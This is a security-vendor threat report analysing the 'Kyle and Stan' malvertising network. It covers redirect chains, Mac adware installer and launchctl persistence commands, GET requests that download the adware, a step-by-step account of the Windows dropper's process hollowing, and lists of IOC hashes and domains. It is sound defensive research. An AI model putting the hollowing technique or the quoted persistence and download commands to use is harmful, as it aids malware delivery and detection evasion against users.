@@ -1,0 +1,409 @@
+
+Threat Spotlight: "Kyle and Stan" Malvertising Network Threatens Windows and Mac Users With Mutating Malware
+
+
+This post was authored by Shaun Hurley, David McDaniel and Armin Pelkmann.  Malware was discovered by Richard Harman.
+
+Update 2014-09-22: Updates on this threat can be found here
+
+
+
+Have you visited amazon.com, ads.yahoo.com, www.winrar.com, youtube.com, or any of the 74 domains listed below lately? If the answer is yes, then you may have been a victim to the "Kyle and Stan" Malvertising Network that distributes sophisticated, mutating malware for Windows and even Macs.
+
+
+Table of contents
+
+Attack in a Nutshell
+Timeline 
+Technical Breakdown
+Reversing of the Mac Malware 
+Reversing of the Windows Malware 
+IOCs
+Conclusion 
+Protecting Users Against These Threats
+
+Malvertising is a short form for "malicious advertising." The idea is very simple: use online advertising to spread malware. 
+
+This attack form is not new, but extremely effective. The world of online ads has only a few major players that are supplying ads to thousands of websites. If an attacker can get one of those major advertisement networks to display an advertisement with a malicious payload just for a few minutes without being detected, then countless machines can be infected by such an attack.
+
+Talos Security Research has uncovered a major network that is doing exactly this. Due to the naming scheme of hundreds of their sub-domains e.g. "stan.mxp2099.com" and "kyle.mxp2038.com," we nicknamed that malvertising group "Kyle and Stan."
+
+
+Attack in a Nutshell
+
+The attack has a lot of variations, but always follows these steps:
+
+You visit a website with the malicious advertisement
+You get redirected to a different website that redirects you based on user agent. We observed that Windows and Mac users get redirected to different malware in order to infect both operating systems
+The final page starts the download of a malicious file
+
+
+
+
+Example Attack Sequence
+
+
+
+Once the victim gets redirected to the final URL, the website automatically starts the download of a unique piece of malware for every user. The file is a bundle of legitimate software, like a media-player, and compiles malware and a unique-to-every-user configuration into the downloaded file. The attackers are purely relying on social engineering techniques, in order to get the user to install the software package. No drive-by exploits are being used thus far. The impressive thing is that we are seeing this technique not only work for Windows, but for Mac operating systems alike. Please visit the Reversing chapters below for a detailed breakdown of the Windows and Mac malware.
+
+
+Timeline and Size of the "Kyle and Stan" Group
+
+The graphic below illustrates the activity observed since Talos began tracking "Kyle and Stan" network. The first hits on our sensors were detected on May 5th. The graphic is using the logarithmic scale, due to the huge changes in activity of the network. The biggest activities were registered in mid June and early July, but attacks are still ongoing.
+
+
+
+Observed connections to the "Kyle and Stan" Network on a log scale.
+
+
+The size of the "Kyle and Stan" network is hard to judge. In our research we have found 700+ domains that are part of their network. This by all means is most likely just the tip of the iceberg. This assumption is supported by the strict name-patterns of found domains. The process could be automated, which makes it very easy to register massive amounts of extra domains. Overall we observed a total of 9541 connections to the malicious domains over the course of our investigation. A full list of the found domains can be downloaded in the IOC Section.
+
+
+Full List of Domains Referring to the "Kyle and Stan" Network
+
+Our data indicates that all of the domains below have at different times displayed malicious advertisement that can be linked to the "Kyle and Stan" group. The list contains a few very popular domains including amazon.com, ads.yahoo.com, www.winrar.com, and youtube.com, which allows the attackers to reach huge numbers of potential victims:
+6nbzz.watch-now.awardcrowd.eu7ruzz.globalrewards.samplestation.euads.yahoo.comamazon.combr5zz.watch-now.awardcrowd.eubvp.burstmedia.comcdn.sharedaddomain.comclkmon.comcr2.gogorithm.comgrooveshark.audio-updates.comgslbeacon.lijit.comjavaapx.comjavaupdating.comjohzz.watchnow.rewardbasket.eujvupdater.comn11.adshostnet.comserve.adsxgm.comw0tzz.watchnow.rewardbasket.euwww.alldldsoft.comwww.allsoftdll.comwww.allsoftpc.comwww.carefulclick.comwww.ddlsoftdirect.comwww.directdls.comwww.directsoftddl.comwww.dllfinalsoft.comwww.dllsoftultimate.comwww.dllultimatesoft.comwww.dlsofteclipse.comwww.downti.comwww.dwnllistsoft.comwww.dwnlsoft.comwww.dwnlultimatesoft.comwww.filenaut.comwww.filenetix.comwww.files101.comwww.filesbunker.comwww.filesonar.comwww.freeunlimitedvideos.comwww.getmplayer.comwww.getsoftdll.comwww.installrecommended.comwww.latestplayerplugin.comwww.lpdownclsva007.comwww.lpdownclsva011.comwww.mediaplayerinstaller.comwww.mediaplayertotal.comwww.moresoftdll.comwww.mysoftdll.comwww.newboxdl.comwww.newplayerupdate.comwww.pcsoftultimate.comwww.pitisoft.comwww.popdls.comwww.proplayersetup.comwww.recommendedfiles1.comwww.recommendedupdate.comwww.recommendedupdate14.comwww.softmediaplayer.comwww.softnewdll.comwww.softplayerdownload.comwww.softultimatedwnl.comwww.thelatestsoft.comwww.thesoftdll.comwww.totalsoftdll.comwww.totalsoftpc.comwww.ultimateplayersetup.comwww.ultimatevideoplayer.comwww.updatedrelease.comwww.updateneeded.comwww.winrar.comwww1.mediaplayernew.comwww1.updateplugins.comyoutube.com
+
+
+
+Technical Breakdown of the Attack
+
+The nickname "Kyle and Stan" comes from the the naming scheme these attackers are using for their domains to distribute the major part of their malware. All the domains directly associated to the attackers are hosted by amazon and use a whois privacy protection service to keep the identity protected (e.g. mxp111.com@whoisprivacycontact.com). Most of the 700+ domains follow the naming scheme of:
+
+kyle.mxp(1-4 digits).com or stan.mxp(1-4 digits).com
+
+There are also specialized domains in the "Kyle and Stan" network that seem to handle the redirecting and act as landing pages. What is special about the attack is that they are targeting Windows and Mac computers alike. Also each malware is unique each time, which makes the detection harder, as the checksums are different each time.
+
+
+Reversing of the Mac Malware
+
+
+
+Browser Hijacker VSearch
+
+
+
+The Mac OS Malware is the legitimate application MPlayerX bundled with two well-known adware/browser hijackers: Conduit and VSearch. Talos reversed two samples of this malware:
+
+Sample 1
+
+MD5: 537a3542c238877629b24195ab8e4ab4
+SHA-256: 8A9CD910DE0349A1FD67D535E7AB6815E30544DD77D479A07932ECCB3F56E66E
+
+
+
+Sample 2
+
+MD5: 0F055F734D211C699A0E9A3418B73514
+SHA-256: 89A6827698BDFF134A2400EE5DB7E4B17256693A27107166EBA973E5B340D8CF
+
+
+
+
+The hashes are different due to the way the each DMG file was constructed. There is no functional difference between these two files. The user has the option to install Conduit. The VSearch installation is not optional. Here is the command that is used:
+
+MPlayerX.app/Contents/Resources/VSInstaller.app/Contents/MacOS/VSInstallerauth 13 –agreetolicens
+
+The Vsearch installer downloads an updated version and installs the files. The following files are created:
+
+VSearchAgent.app →  /Library/Application Support/VSearch/Agent
+VSearchPlugIn.bundle →  /System/Library/Frameworks/VSearch.framework/Versions/A/
+
+VsearchLoader.bundle
+DP.plist
+libVSearchLoader.dylib
+libVSearchLoader.dylib 
+
+
+
+
+
+Vsearch Persistence
+
+A launcher is added to maintain persistence between reboots. The following commands are used to add the launcher:
+
+/bin/launchctl load -F /Library/LaunchDaemons/com.vsearch.daemon.plist
+
+/bin/launchctl start com.vsearch.daemon
+
+
+URL Requests
+
+The following GET requests are made to 'dfwu1013.info ' to download and install Vsearch.
+
+GET /vsearch/installer?dp=DP2152&sdp=0001&f=99&id=12EC363D-6EEE-4D82-A953-D4B04492687E&v=1000010 HTTP/1.1
+
+GET /vsearch/installer?dp=DP2152&sdp=0001&f=00&id=12EC363D-6EEE-4D82-A953-D4B04492687E&v=1000010 HTTP/1.1
+
+
+Reversing of the Windows Malware
+
+Upon further analysis of the Windows sample, it became clear that we found an adware/spyware dropper that has an interesting way of retrieving its various payloads through a GET request. The dropper is a 32 bit executable written in C++.
+
+
+MD5: 602c94e82c83bbaea1abdea420e0b939
+
+SHA-256: ee87af42dda91f6ed6ccedcd20736cb1d00a96f26138c0c6698c9837c1525dee
+
+The GET request is at first glance a seemingly random URI and begins the installation of several common Spyware/Adware applications. The adware bundle locations are retrieved in the server response and later executed.
+
+
+
+The installer window presented to the user after it “checks your system”
+
+
+
+
+
+The initial GET request sent upon execution. Followed by the response with what the dropper should download
+
+
+
+The initial dropper uses a sophisticated technique called “Dynamic Forking” also known as “Process Hollowing.” Dynamic forking, is a technique that allows to execute an image within another process's address space. The following chapter analyzes the technique in detail.
+
+
+Dynamic Forking 101
+
+
+1. Create a SUSPENDED Process
+
+
+Create the host process (this dropper) again, but in a SUSPENDED state
+
+
+
+
+
+
+
+
+
+2. Get Thread Context
+
+Obtain the thread context of the new process using GetThreadContext()
+
+CONTEXT->EAX points to what will be the entry point of the executable
+CONTEXT->EBX points to the PEB
+
+
+
+
+
+3. Get Base Address of Child Executable
+
+
+Get the base address of the new executable using the PEB ([ebx + 8])
+
+
+ 
+
+
+4. Read [and Decrypt] New Executable into Memory
+
+
+This particular sample stores the child executable encrypted in the resource section. It uses and XOR decryption routine with this key:
+
+
+
+
+
+It uses that key with the following pseudocode:
+
+
+
+
+
+Other samples that I found use the same routine but with a different key.
+
+
+For example, one of the encoded buffers is located in the static dropper .rsrc section. To the left is the encoded version with the decoded version to the right. Notice that this decodes to the file magic of a PE32:
+
+
+This decoded buffer is then saved and stored for later.
+
+ 
+
+
+
+5. Unmap the Image, Reallocate Space, & Write the New Executable
+
+
+If the decoded/new executable doesn’t have the same base address or is a larger size than the host process, unmap the host process’s image using ZwUnmapViewOfSection and re-allocate that space.
+
+
+
+
+
+
+6. Set Thread Context and Resume
+
+
+Write the new entry point to EAX (in the CONTEXT structure obtained earlier). If the base address is different, it would be important to write that to the structure as well. Afterwards, use SetThreadContext() to apply the changes using the modified CONTEXT structure.
+
+
+
+
+
+
+Attaching to the Child Executable
+
+
+In order to debug the child executable, a little math is needed. You have (at least) two options, both require determining what bytes will be copied to the Entry Point (EP) of the child executable before the thread is resumed.
+
+
+Set the EP bytes to CC (int 3) and set your Just-in-Time Debugger to catch the exception.
+Set the EP bytes to an infinite loop (EB FE) and just allow the parent process to gracefully exit before attaching. I chose this method.
+
+
+
+The EP of the child will be EAX in the CONTEXT structure set in the child executable using SetThreadContext(). Since we also know where the bytes that occupy that space come from (the decryption routine from earlier), simply get the offset of EAX from the base address of the child executable and add that to the base address of the memory that is copied there:
+
+
+
+
+
+Once the process has resumed, the child process should be executing at around 100% of CPU time.
+
+
+
+
+
+Replace the original bytes and continue on.
+
+
+
+
+
+
+Intercepting the GET Request Construction with JavaScript Injection
+
+
+
+
+After the first installation screen, a child process is spawned, which then creates a window containing a message claiming to check the system, while also utilizing hidden web browser functionality. This window loads an HTML file containing 6,900 lines of obfuscated JavaScript. This JavaScript contains two well-known libraries: CryptoJS and jQuery. The file is located in the child executable statically, but it does not run on its own, the JavaScript is called from elsewhere in the binary.
+
+
+Determining if the JavaScript in the static executable is the same Script that is eventually gets executed, can be accomplished by injecting custom JavaScript. It must be done in a way that doesn’t affect the size of the HTML document. One way to do this is to inject our own code into comment sections.
+
+
+
+
+
+I have just enough room to replace that with this code which should open a new browser window populated with whatever code is on the page. Note that I had to delay the execution of the JavaScript so that the entire page was loaded.
+
+
+
+
+
+Which is easy to do in Windbg.
+
+
+
+
+
+Now just let the program execute to completion. It may say that an error occurred if a proper response is not received, it doesn’t matter. Click the OK button and a new window should pop up containing the full HTML document used in this embedded window :)
+
+
+
+
+
+It is indeed the same JavaScript from the static child executable. After a bit of de-obfuscation and testing, 2 key functions were found.
+
+
+
+
+To determine how (and if) the cryptString() function was used, simply employ the same technique above to overwrite the return call in the “cryptString()” function and the function declaration of the “deCryptString()” function. Since we don’t care about the malware being able to decrypt anything at this point, overwriting it for testing purposes doesn’t matter here. Plus, it keeps the JavaScript section the exact same size (make sure to zero out any unused bytes that occupy the leftover space in this function to avoid an exception).
+
+
+
+
+Search for the location in memory and overwrite it with a helpful alert box.
+
+ 
+
+
+Bingo
+
+
+
+
+
+Clicking OK will initiate the GET request, since we left this function effectively in tact.
+
+
+
+
+
+It is now clear how the GET request is generated locally using CryptoJS’ AES w/ CBC functionality. Also note that the key and IV is randomly generated. To test this theory, simply import the HTML into a local document and run the deCryptString() function previously overwritten with the URI.
+
+
+
+
+
+
+
+
+The URI is successfully decrypted and displayed.
+
+
+
+
+
+The path is built inside of the getData() function. It will at least contain “/stan/api_war/” and is constructed as follows:
+
+ 
+
+
+When used with this URI, we can determine its meaning. Note that Region and Browser fetching was unsuccessful on this particular machine. However, I have seen this work on other machines. For example, Google Chrome shows as “?browser=ch”.
+
+
+
+
+
+
+IOCs
+
+Here you can find the full list of domains associated to the "Kyle and Stan" Network: IOC_Kyle_and_Stan
+
+Windows Malware:
+
+MD5: 602c94e82c83bbaea1abdea420e0b939
+SHA-256: ee87af42dda91f6ed6ccedcd20736cb1d00a96f26138c0c6698c9837c1525dee
+
+
+Mac Malware:
+
+
+Sample 1
+
+MD5: 537a3542c238877629b24195ab8e4ab4
+SHA-256: 8A9CD910DE0349A1FD67D535E7AB6815E30544DD77D479A07932ECCB3F56E66E
+
+
+
+Sample 2
+
+MD5: 0F055F734D211C699A0E9A3418B73514
+SHA-256: 89A6827698BDFF134A2400EE5DB7E4B17256693A27107166EBA973E5B340D8CF
+
+
+
+
+
+Conclusion
+
+The "Kyle and Stan" network is a highly sophisticated Malvertising Network. It leverages the enormous reach of well-placed malicious advertisements on very well-known websites, in order to potentially reach millions of users. The goal is to infect Windows and Mac users alike with spyware, adware, and browser hijackers. It is not too far fetched that other kinds of malware are being used as well. The malware droppers employ clever techniques and encryption to always have unique checksums to avoid detection. Over 700  domains of the "Kyle and Stan" network have been unveiled by this investigation. It is very likely that there are even more domains part of the group behind this. The large number of domains allows the attackers to use a certain domain just for a very short time, burn it and move on to use another one for future attacks. This helps avoiding reputation and blacklist based security solutions. All in all we are facing a very robust and well-engineered malware delivery network that won't be taken down until the minds behind this are identified.
+
+
+Protecting Users Against These Threats
+
+
+Advanced Malware Protection (AMP) is well suited to detect and block this type of  malware.
+
+CWS or WSA web scanning will prevent access to the websites of the "Kyle and Stan" network.
+
+The Network Security protection of IPS and NGFW have up-to-date signatures and will block this threat.
+
+ESA is not applicable for this attack, because the threat is not using email.
+
+
